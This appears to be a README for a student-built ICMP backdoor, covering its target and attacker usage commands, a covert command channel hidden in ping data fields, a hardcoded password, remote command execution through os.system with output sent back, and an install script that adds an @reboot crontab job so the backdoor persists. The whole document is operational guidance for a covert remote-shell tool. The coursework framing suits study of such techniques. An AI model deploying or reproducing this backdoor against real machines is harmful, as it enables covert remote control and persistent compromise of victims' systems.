Usage:
The target:
$ sudo python backdor.py -h <ip_of_attacker_machine> -b <ip_of_target_machine>

or, execute as root:
$ ./install.sh <ip_of_attacker_machine>
$ ./run.sh <ip_of_attacker_machine>

This will also add to the crontab file a job to run the backdoor when the computer reboots.


The attacker:
$ sudo python server.py -h <ip_of_target_machine> -b <ip_of_attacker_machine>

or, execute as root:
$ ./install.sh
$ ./run.sh -h <ip_of_target_machine>




How they work:
Both backdor.py and server.py are based off "ping.pyx", the code from activity 1 used to ping. Because it already have most of what we need to send icmp messages, we can only adjust it.
The first difference between ping.pyx and backdor.py and server.py is that instead of using "ICMP_ECHO_REQUEST", we use "ICMP_ECHO_REPLY". Using request caused me trouble when testing in my machine.

How server.py works:
We keep recieven pings and testing if they have the string "connected" on the optional data field. This is an arbritary string, the only requirement is that the victim's machine sends the same string that the server is waiting.  After finding this string, we have to "authenticate", so we send a ping with the password on the optional data field. The password i chose is just "password" (not secure at all, but works for what I want to do). After sending the password, we wait for a rersponse from the victim's machine that our password was right ("OK"). Then, when "Enter command" shows up, we just read the commands we want to execute at the victim machine, and send them, again, on the opt. data field, and recieve the output back from the victim's machine.

How backdoor.py works:
We keep sending a ping with the "connected" string on the opt. data, and keep checking if we got the password back. When we find the password, we send an "OK" message to the server. Then, we keep getting the commands from the server, and we execute them using "os.system". To send the output, we simply redirect the output of the command to a file, and send the content of the file.



When using install.sh <ip_address> (on the backdor):
We install python pip and cython in the machine if they're not yet present.
After that, first find out the version of python in the machine. Then, we make, the source code is turned into a C file, then into an executable. We change it's permissions so it can be executed by any users, not only root. After that, we add to /etc/crontab a job that happens when the pc is rebooted (@reboot) that runs the backdoor with the <ip_address> we set, and it binds the sockets it opens to the first ip address it finds using $hostname -I




When using install.sh (on the server)
We install python pip and cython in the machine if they're not yet present.
After that, first find out the version of python in the machine. Then, we make, the source code is turned into a C file, then into an executable. We change it's permissions so it can be executed by any users, not only root.
To run it, we can use $./run.sh <target_ip_address>, and it binds the sockets it opens to the first ip address it finds using $hostname -I